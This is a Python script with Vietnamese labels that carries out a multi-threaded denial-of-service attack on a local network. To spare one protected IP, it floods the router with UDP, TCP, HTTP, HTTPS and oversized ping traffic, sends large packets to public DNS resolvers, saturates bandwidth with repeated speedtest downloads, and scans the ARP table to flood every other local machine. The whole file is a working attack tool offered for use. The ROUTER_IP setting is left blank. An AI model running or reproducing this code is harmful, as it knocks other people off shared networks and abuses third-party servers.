import requests
import subprocess
import threading
import time
import os
import subprocess
import random
import socket

# ===== CẤU HÌNH =====
ROUTER_IP = 
THOI_GIAN = 120  # 60 giây
MY_IP = "192.168.1.30"  # IP được bảo vệ (không bị lag)

print(f"🛡️ IP được bảo vệ: {MY_IP}")

# ==============================================
# CÁCH 1: TẢI FILE BẰNG CURL (CỰC MẠNH)
# ==============================================
def download_with_wget():
    """Dùng curl/wget để tải file - hiệu quả nhất"""
    urls = [
        "http://speedtest.tele2.net/100MB.zip",
        "http://speedtest.tele2.net/50MB.zip",
        "http://ipv4.download.thinkbroadband.com/100MB.zip",
        "https://www.thinkbroadband.com/download/100MB.zip",
        "http://cachefly.cachefly.net/1000mb.test",  # 1GB
        "http://speedtest.tele2.net/1000MB.zip",     # 1GB
    ]
    while True:
        try:
            url = random.choice(urls)
            if os.name == 'nt':  # Windows
                subprocess.run(['curl', '-s', '-o', 'NUL', url], timeout=3)
                subprocess.run(['curl', '-s', '-o', 'NUL', url], timeout=3)
            else:
                subprocess.run(['wget', '-q', '-O', '/dev/null', url], timeout=3)
                subprocess.run(['wget', '-q', '-O', '/dev/null', url], timeout=3)
        except:
            pass

# ==============================================
# CÁCH 2: DOWNLOAD BẰNG REQUESTS (CHUNK NHỎ)
# ==============================================
def download_super():
    """Tải với chunk nhỏ để tăng overhead"""
    urls = [
        "http://speedtest.tele2.net/100MB.zip",
        "http://speedtest.tele2.net/50MB.zip",
        "http://ipv4.download.thinkbroadband.com/100MB.zip",
        "http://cachefly.cachefly.net/100mb.test",
        "http://speedtest.tele2.net/1000MB.zip",
    ]
    while True:
        try:
            url = random.choice(urls)
            r = requests.get(url, stream=True, timeout=2)
            # Chunk nhỏ để tăng overhead (gây lag hơn)
            for chunk in r.iter_content(chunk_size=64):  # 64 bytes
                pass
        except:
            pass

# ==============================================
# CÁCH 3: UDP FLOOD CỰC MẠNH
# ==============================================
def udp_super():
    """Gửi UDP với tần suất cực cao"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * 65507
    
    targets = [
        (ROUTER_IP, 53),
        (ROUTER_IP, 80),
        (ROUTER_IP, 443),
        (ROUTER_IP, 8080),
        ("8.8.8.8", 53),
        ("1.1.1.1", 53),
        ("208.67.222.222", 53),
        ("9.9.9.9", 53),
    ]
    
    while True:
        try:
            for target in targets:
                for _ in range(200):  # 100 → 200
                    sock.sendto(payload, target)
        except:
            pass

# ==============================================
# CÁCH 4: TCP FLOOD CỰC MẠNH
# ==============================================
def tcp_super():
    """Tạo hàng ngàn kết nối TCP"""
    sockets = []
    ports = [80, 443, 135, 445, 3389, 8080, 1433, 3306]
    
    while True:
        try:
            for port in ports:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect((ROUTER_IP, port))
                s.send(b"X" * 100000)
                sockets.append(s)
                
                if len(sockets) > 8000:  # 5000 → 8000
                    for _ in range(200):
                        try:
                            old = sockets.pop(0)
                            old.close()
                        except:
                            pass
        except:
            pass

# ==============================================
# CÁCH 5: HTTP FLOOD CỰC MẠNH
# ==============================================
def http_super():
    """Gửi HTTP request liên tục với header dài"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((ROUTER_IP, 80))
            # Header dài 5000 bytes
            s.send(b"GET / HTTP/1.1\r\n" + b"X-Header: " + b"A"*5000 + b"\r\n\r\n" * 100)
            s.close()
        except:
            pass

# ==============================================
# CÁCH 6: HTTPS FLOOD
# ==============================================
def https_super():
    """Gửi request HTTPS đến router"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((ROUTER_IP, 443))
            s.send(b"GET / HTTP/1.1\r\nHost: " + ROUTER_IP.encode() + b"\r\n\r\n" * 100)
            s.close()
        except:
            pass

# ==============================================
# CÁCH 7: PING FLOOD
# ==============================================
def ping_super():
    """Gửi ping khổng lồ liên tục"""
    while True:
        try:
            if os.name == 'nt':
                subprocess.run(['ping', '-l', '65500', '-n', '1', ROUTER_IP],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['ping', '-l', '65500', '-n', '1', "8.8.8.8"],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            else:
                subprocess.run(['ping', '-s', '65500', '-c', '1', ROUTER_IP],
                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# ==============================================
# CÁCH 8: DNS AMPLIFICATION
# ==============================================
def dns_super():
    """Gửi DNS query lớn"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    long_domain = b".".join([b"a" * 63 for _ in range(20)])
    
    while True:
        try:
            dns_query = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
            for part in long_domain.split(b'.'):
                dns_query += bytes([len(part)]) + part
            dns_query += b"\x00\x00\x01\x00\x01"
            
            sock.sendto(dns_query, (ROUTER_IP, 53))
            sock.sendto(dns_query, ("8.8.8.8", 53))
            sock.sendto(dns_query, ("1.1.1.1", 53))
        except:
            pass

# ==============================================
# CÁCH 9: TẤN CÔNG VÀO CÁC MÁY KHÁC
# ==============================================
def scan_and_attack():
    """Quét mạng và tấn công các máy khác (TRỪ IP ĐƯỢC BẢO VỆ)"""
    while True:
        try:
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            lines = result.stdout.split('\n')
            target_ips = []
            
            for line in lines:
                if '192.168.' in line:
                    parts = line.split()
                    for part in parts:
                        if part.startswith('192.168.') and '.' in part:
                            if part != ROUTER_IP and part != MY_IP:
                                target_ips.append(part)
            
            target_ips = list(set(target_ips))
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = b"X" * 65507
            
            for ip in target_ips:
                for port in [80, 443, 445, 3389, 8080]:
                    sock.sendto(payload, (ip, port))
            sock.close()
        except:
            pass
        time.sleep(0.05)

# ==============================================
# MONITOR
# ==============================================
def monitor():
    """Hiển thị băng thông đang sử dụng"""
    try:
        import psutil
        start_time = time.time()
        while True:
            net = psutil.net_io_counters()
            dl_mbps = net.bytes_recv / 1024 / 1024 * 8
            ul_mbps = net.bytes_sent / 1024 / 1024 * 8
            total_gb = (net.bytes_recv + net.bytes_sent) / 1024**3
            elapsed = time.time() - start_time
            print(f"\r📡 DL: {dl_mbps:.0f} Mbps  UL: {ul_mbps:.0f} Mbps  |  📊 {total_gb:.2f}GB  |  ⏱️ {elapsed:.0f}s  |  🧵 {threading.active_count()}", end="", flush=True)
            time.sleep(0.3)
    except:
        pass

# ==============================================
# MAIN
# ==============================================
def main():
    print("=" * 70)
    print("🔥🔥🔥 LAG SIÊU MẠNH - GẤP 5 LẦN")
    print("=" * 70)
    print(f"🛡️ IP được bảo vệ: {MY_IP} (KHÔNG BỊ LAG)")
    print(f"📡 Router IP: {ROUTER_IP}")
    print(f"⏱️ Thời gian: {THOI_GIAN} giây")
    print("=" * 70)
    print("⚔️ VŨ KHÍ TẤN CÔNG (TĂNG GẤP 5 LẦN):")
    print("  📥 Download Curl    - 50 luồng")
    print("  📥 Download Super   - 50 luồng")
    print("  📤 UDP Flood        - 30 luồng")
    print("  🔗 TCP Flood        - 20 luồng")
    print("  🌐 HTTP Flood       - 20 luồng")
    print("  🔒 HTTPS Flood      - 20 luồng")
    print("  📦 Ping Flood       - 10 luồng")
    print("  📤 DNS Amplification - 10 luồng")
    print("  🔍 Quét & Tấn công  - 10 luồng")
    print("=" * 70)
    
    confirm = input("\n⚠️ Nhập 'yes' để bắt đầu (CỰC MẠNH): ")
    if confirm.lower() != 'yes':
        print("Đã hủy.")
        return
    
    print("\n🚀 KHỞI ĐỘNG TẤN CÔNG CỰC MẠNH...")
    
    # ===== TẠO CÁC LUỒNG TẤN CÔNG (TĂNG GẤP 5 LẦN) =====
    
    # 1. Download curl - 50 luồng
    print("📡 50 luồng Download Curl...")
    for i in range(50):
        threading.Thread(target=download_with_wget, daemon=True).start()
    
    # 2. Download super - 50 luồng
    print("📡 50 luồng Download Super...")
    for i in range(50):
        threading.Thread(target=download_super, daemon=True).start()
    
    # 3. UDP Flood - 30 luồng
    print("📡 30 luồng UDP Flood...")
    for i in range(30):
        threading.Thread(target=udp_super, daemon=True).start()
    
    # 4. TCP Flood - 20 luồng
    print("📡 20 luồng TCP Flood...")
    for i in range(20):
        threading.Thread(target=tcp_super, daemon=True).start()
    
    # 5. HTTP Flood - 20 luồng
    print("📡 20 luồng HTTP Flood...")
    for i in range(20):
        threading.Thread(target=http_super, daemon=True).start()
    
    # 6. HTTPS Flood - 20 luồng
    print("📡 20 luồng HTTPS Flood...")
    for i in range(20):
        threading.Thread(target=https_super, daemon=True).start()
    
    # 7. Ping Flood - 10 luồng
    print("📡 10 luồng Ping Flood...")
    for i in range(10):
        threading.Thread(target=ping_super, daemon=True).start()
    
    # 8. DNS Amplification - 10 luồng
    print("📡 10 luồng DNS Amplification...")
    for i in range(10):
        threading.Thread(target=dns_super, daemon=True).start()
    
    # 9. Quét và tấn công - 10 luồng
    print("📡 10 luồng Quét & Tấn công...")
    for i in range(10):
        threading.Thread(target=scan_and_attack, daemon=True).start()
    
    # 10. Monitor
    threading.Thread(target=monitor, daemon=True).start()
    
    print("\n" + "=" * 70)
    print("🔥🔥🔥 ĐANG TẤN CÔNG SIÊU MẠNH!")
    print(f"🛡️ IP {MY_IP} VẪN DÙNG BÌNH THƯỜNG")
    print("❌ TẤT CẢ CÁC IP KHÁC BỊ LAG NẶNG")
    print("💻 Network sẽ lên 100%")
    print("=" * 70)
    
    # Đếm ngược
    for i in range(THOI_GIAN, 0, -1):
        print(f"\r⏱️ Còn {i:2d} giây...  🔥 Cường độ: CỰC MẠNH", end="", flush=True)
        time.sleep(1)
    
    print("\n\n" + "=" * 70)
    print("✅ KẾT THÚC!")
    print("🔓 Mạng trở lại bình thường")
    print("=" * 70)

if __name__ == "__main__":
    try:
        import psutil
    except:
        os.system('pip install psutil')
        import psutil
    
    main()